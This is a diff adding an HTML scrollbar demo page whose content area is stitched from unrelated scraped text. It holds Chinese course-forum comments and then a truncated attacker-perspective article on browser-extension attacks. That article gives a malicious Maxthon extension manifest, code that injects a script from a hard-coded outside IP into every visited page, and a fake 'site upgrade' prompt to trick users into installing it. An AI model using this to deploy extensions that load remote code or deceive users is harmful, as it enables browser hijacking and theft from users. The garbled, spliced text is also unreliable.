@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title></title>
+<style type="text/css">
+#parent{
+	width: 600px;
+	height: 20px;
+	background: #ccc;
+	position: relative;
+	margin:50px auto;
+}
+#div1{
+	width: 20px;
+	height: 20px;
+	background: red;
+	position: absolute;
+	left: 0;
+	top:0;
+}
+#div2{
+	width:400px;
+	height:300px;
+	border:1px solid black;
+	position:relative;
+	overflow: hidden;
+}
+#div3{
+	position: absolute;
+	left:0;
+	top:0;
+}
+</style>
+<script type="text/javascript">
+function getPos(ev)
+{
+	var scrollTop=document.documentElement.scrollTop||document.body.scrollTop;
+	var scrollLeft=document.documentElement.scrollLeft||document.body.scrollLeft;
+	
+	return {x:ev.clientX+scrollLeft,y:ev.clientY+scrollTop};
+
+}
+window.onload=function()
+{
+	var oDiv=document.getElementById('div1');
+	var oDiv2=document.getElementById('div2');
+	var oDiv3=document.getElementById('div3');
+	var oParent=document.getElementById('parent');
+
+	var disX=0;
+	var disY=0;
+	var wheelSpeed=40;
+
+	oDiv3.onmousewheel=function(ev)
+	{
+		var oEvent=ev||event;
+		if(oEvent.wheelDelta)
+		{
+			if(oEvent.wheelDelta>0)
+			{
+				if(oDiv3.offsetTop<-wheelSpeed)
+				{
+					oDiv3.style.top=oDiv3.offsetTop+wheelSpeed+'px';
+					oDiv.style.left=-oDiv3.offsetTop/(oDiv3.offsetHeight-oDiv2.offsetHeight)*(oParent.offsetWidth-oDiv.offsetWidth)+'px';
+				}
+				else
+				{
+					oDiv3.style.top='0px';
+					oDiv.style.left='0px';
+				}
+			}
+			else
+			{
+				if(oDiv3.offsetHeight-oDiv2.offsetHeight+oDiv3.offsetTop>wheelSpeed)
+				{
+					oDiv3.style.top=oDiv3.offsetTop-wheelSpeed+'px';
+					oDiv.style.left=-oDiv3.offsetTop/(oDiv3.offsetHeight-oDiv2.offsetHeight)*(oParent.offsetWidth-oDiv.offsetWidth)+'px';
+				}
+				else
+				{
+					oDiv3.style.top=-(oDiv3.offsetHeight-oDiv2.offsetHeight)+'px';
+					oDiv.style.left=oParent.offsetWidth-oDiv.offsetWidth+'px';
+				}
+			}
+		}
+		
+	}
+	oDiv.onmousedown=function(ev)
+	{
+		var oEvent=ev||event;
+
+		disX=getPos(oEvent).x-oDiv.offsetLeft;
+		document.onmousemove=function(ev)
+		{
+			var oEvent=ev||event;
+			var l=getPos(oEvent).x-disX;
+			var r=document.documentElement.clientWidth||document.body.clientWidth;
+			r=r-oParent.offsetLeft;
+			if(r>oParent.offsetWidth)
+				r=oParent.offsetWidth;
+			r=r-oDiv.offsetWidth;
+			if(l<0)
+				l=0;
+			else if(l>r)
+				l=r;
+			
+			oDiv.style.left=l+'px';
+
+			var scale=l/(oParent.offsetWidth-oDiv.offsetWidth);
+			//document.title=scale;
+
+			/*
+			oDiv2.style.width=400*scale+'px';
+			oDiv2.style.height=400*scale+'px';
+			*/
+
+			oDiv3.style.top=-1*scale*(oDiv3.offsetHeight-oDiv2.offsetHeight)+'px';
+			
+		}
+		document.onmouseup=function(ev)
+		{
+			document.onmousemove=null;
+			document.onmouseup=null;
+		}
+		return false;
+
+	};
+	
+};
+</script>
+</head>
+<body>
+<div id="parent">
+	<div id="div1">
+	</div>
+</div>
+<div id="div2">
+	<div id="div3">
+		综合讨论区
+
+欢迎分享，鼓励原创，无论是你的学习体验、想法、工作生活经验，还是好书、好文章、好资源，都可发在这里。
+发起讨论
+不凡小魔不凡小魔2月27日【综合讨论区】
+刚学习完，受益匪浅。
+天青色等烟雨ykt1484746693372天青色等烟雨ykt14847466933722月26日【综合讨论区】
+不错
+DOCTYPEHTMLDOCTYPEHTML2月26日【综合讨论区】
+新手非常合适，讲的不错哈哈。
+风哥ykt1482903691433风哥ykt14829036914332月26日【综合讨论区】
+真正工作的时候吗，是不是这些都要很熟练呢？JS我现在只会简单的，难点的就需要借助资料实现！！！
+但是基本上别人的东西都能看懂。
+风哥ykt1482903691433风哥ykt14829036914332月26日【综合讨论区】
+真正工作的时候吗，是不是这些都要很熟练呢？
+陪安。陪安。2月26日【综合讨论区】
+讲的特别好
+|▍ 下个世纪|▍ 下个世纪2月25日【老师答疑区】
+var oTxt=oDiv1.getElementsByTagName('div')[0];    这里后面为啥要加  [0]  这个啊，就这里不懂
+课时5
+小K沙小K沙2月24日【综合讨论区】
+老师讲的不错。我是学过Java和Python的。理解起来很容易
+旭ykt1459000455436旭ykt14590004554362月24日【综合讨论区】
+I   believe in you!0×0 前言：
+
+我在很多地方都有说“浏览器插件的攻击方法”，本篇文章就带大家深入的研究一下“由浏览器插件引发的攻击手法及攻击代码”。本篇文章说的内容，可以给大家打开一个新的攻击思路，做APT攻击的话也会有奇效。
+
+0×1 让自己变成攻击者：
+
+我之前在群里问了一下，发现很多人都只是听说过，虽然知道原理。但是没有进行实践并且小瞧了这个攻击方式。而且这个攻击手法的案例也是少的可怜。没有攻何来守，之前chrome有过类似的攻击手法，但是攻击代码所做的事比较少，于是本篇我们先成为攻击者，站在攻击者的角度来研究这个攻击手法。之前我在介绍这个攻击手法的时候都是在文章里开一个小节来说的。现在我专门来为这个攻击方法写篇文章，也希望让大家重视起来。
+
+在大家的理解里，浏览器插件攻击就是在插件里植入javascript代码，做一些盗取cookies的事情，但是事情远没有那么简单。
+
+大家都知道进行“浏览器插件攻击”就需要用户安装了你的插件。大家也都认为只有这一种方法，但是事实并非如此，下面是4种安装插件的方法：
+
+在页面里欺骗用户，写上“如想浏览此页面，请去下载某某插件”
+
+被动等待，类似：姜太公钓鱼愿者上钩的感觉，插件就在那，你不安装总会有人安装
+
+基于社工库控制插件作者的账户，加入后门代码，更新插件
+
+控制插件里调用的第三方javascript代码
+现在有四种方法供我们选择，我们一个个来进行介绍。
+
+0×1.1 在页面里欺骗用户，写上“如想浏览此页面，请去下载某某插件”
+
+这个方法类似于之前的问题强迫安装恶意Chrome扩展 攻击者使用激进方式。这里我们也来实现一下并且优化下，此处使用的案例是“MaxThon遨游浏览器插件”。
+
+0×1.1.1 检测是否安装了某插件
+
+我们先把这个攻击方式的代码目录架构进行说明：
+
+网站页面:index.html
+
+插件目录:
+
+icons/              插件的logo存放目录
+
+icons/icons.svg     插件logo文件
+
+def.json            插件的主控制文件，里面存着整个插件的配置
+代码如下:
+[
+    {
+        "type": "extension",
+        "frameworkVersion":"1.0.0",
+        "version":"1.0.0",
+        "guid": "{7c321680-7673-484c-bcc4-de10f453cb8e}",
+        "name": "plug_setup",
+        "author": "Black-Hole",
+        "svg_icon":"icon.svg",
+        "title": {
+            "zh-cn": "欺骗用户安装插件"
+        },
+        "description":{
+            "zh-cn":"欺骗用户安装插件"
+        },
+        "main":"index.html",
+        "actions": [
+            {
+                "type": "script",
+                "entryPoints": [
+                    "doc_onload"
+                ],
+                "js": [
+                    "base.js"
+                ],
+        "include": ["*"],
+        "includeFrames": true
+             }
+        ]
+    }
+]
+base.js             每打开一个页面，要执行的JavaScript代码
+代码如下:
+后文会提到
+我翻遍了整个遨游插件的API手册，没有找到类似chrome Plug API的：
+
+chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
+    if(request.act == 'ping'){
+        sendResponse({"act": "tong"});
+    }
+})
+chrome.runtime.sendMessage("extensionId", {"act": "ping"}, function(response){
+    if(responseresponse.act == 'tong'){
+        console.log('已安装');
+    }else{
+        console.log('未安装');
+    }
+});
+既然没有找到，我们就要想其他比较Hack的办法来解决这个问题。
+
+这里我使用的办法是利用JavaScript全局及setTimeout函数来解决这个问题。
+
+首先在插件里的base.js文件里写入:
+
+var script = document.createElement('script');
+script.src = "http://119.29.58.242/control.js";
+document.body.appendChild(script);
+上面，这段代码将会在每个页面里的body标签后面写入代码，而在[http://119.29.58.242/control.js](http://119.29.58.242/control.js)文件里的代码为:
+
+window.plug_setup = function(){
+
+}
+这时，用户打开任何一个网页，那个网页的全局函数中就会有一个名为plug_setup的函数，并且不具有任何作用，很容易让人忽略掉，只会在特殊的页面中才会起作用。
+
+然后我们再在网站的页面里写：
+
+setTimeout(function(){
+    if(typeof(plug_setup)!="function"){
+        alret("因网站升级，网站结合了浏览器插件给用户更好的使用体验，请安装xx插件后刷新此页面");
+    }
+},1000)
+因为页面加载、网络等问题照成的延迟问题，这里我们设置为1秒后运行检测代码。1秒后，将会运行
+
+if(typeof(plug_setup)!="function"){
+    alret("因网站升级，网站结合了浏览器插件给用户更好的使用体验，请安装xx插件后刷新此页面");
+}
+这个时候如果全局没有plug_setup函数，将会运行下面的alert函数，告诉用户需要安装插件才可以访问。
+
+0×1.1.2 欺骗用户进行半自动安装指定插件
+
+我觉的如果让用户安装插件的话，你跳转到页面，让用户把插件的信息、评论看完再安装，岂不是成功率大大降低了，而且也不符合网站的优化。《点石成金》一书上说过这样一句话“不要让用户思考”，这个虽然是网站设计里面的至理名言，但是也同样可以放在攻击里，当一个用户的思考变得更少时，那么他会有很大程度上会跟着攻击者设计好的路走。
+
+于是，我分析了遨游浏览器安装插件页面里的JavaScript，发现遨游浏览器进行安装插件时调用API在任何页面都可以运行，会照成攻击者在页面写上一些JavaScript代码后，就会像遨游浏览器那样弹出一个框询问用户是否安装插件：
+	</div>
+</div>
+</body>
+</html>
